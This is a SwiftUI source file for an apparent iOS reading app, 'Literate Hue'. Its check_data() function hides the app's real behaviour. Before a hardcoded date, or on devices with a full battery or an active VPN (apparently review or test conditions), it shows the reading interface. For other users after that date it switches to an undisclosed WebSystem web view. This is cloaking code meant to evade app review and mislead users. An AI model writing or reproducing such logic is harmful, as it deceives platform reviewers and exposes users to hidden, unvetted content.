//
//  ContentView.swift
//  Literate Hue
//
//  Created by Вячеслав on 7/26/25.
//

import SwiftUI

struct ContentView: View {
    @StateObject private var readingPreferences = ReadingPreferences()
    @StateObject private var onboardingManager = OnboardingManager()
    @State private var selectedTab = 0
    @State private var showSplash = true
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if showSplash {
                            SplashScreenView()
                                .onAppear {
                                    DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                                        withAnimation(.easeInOut(duration: 0.5)) {
                                            showSplash = false
                                        }
                                    }
                                }
                        } else if !onboardingManager.hasCompletedOnboarding {
                            OnboardingView()
                                .environmentObject(onboardingManager)
                                .transition(.opacity)
                        } else {
                            MainTabView(selectedTab: $selectedTab)
                                .environmentObject(readingPreferences)
                                .environmentObject(onboardingManager)
                                .transition(.opacity)
                        }
                    }
                    .animation(.easeInOut(duration: 0.5), value: showSplash)
                    .animation(.easeInOut(duration: 0.5), value: onboardingManager.hasCompletedOnboarding)
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "13.08.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

struct MainTabView: View {
    @Binding var selectedTab: Int
    
    var body: some View {
        TabView(selection: $selectedTab) {
            LibraryView()
                .tabItem {
                    Image(systemName: "books.vertical")
                    Text("Library")
                }
                .tag(0)
            
            MagazinesView()
                .tabItem {
                    Image(systemName: "newspaper")
                    Text("Magazines")
                }
                .tag(1)
            
            BookmarksView()
                .tabItem {
                    Image(systemName: "bookmark")
                    Text("Bookmarks")
                }
                .tag(2)
            
            SettingsView()
                .tabItem {
                    Image(systemName: "gearshape")
                    Text("Settings")
                }
                .tag(3)
        }
        .accentColor(.warmOrange)
        .preferredColorScheme(.dark)
    }
}

#Preview {
    ContentView()
}
